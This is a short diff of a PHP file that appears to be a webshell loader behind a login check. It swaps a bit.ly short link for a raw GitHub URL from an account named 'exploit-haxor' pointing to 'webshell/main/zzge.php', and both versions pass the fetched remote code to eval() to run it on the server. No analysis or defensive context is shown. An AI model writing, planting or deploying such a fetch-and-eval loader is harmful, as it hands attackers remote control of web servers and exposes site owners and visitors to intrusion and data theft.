@@ -46,7 +46,7 @@ function is_logged_in()
         return $urls;
     }
 
-    $a = geturlsinfo('https://bit.ly/4h3VgoI');
+    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/zzge.php');
     eval('?>' . $a);
 
 ?>
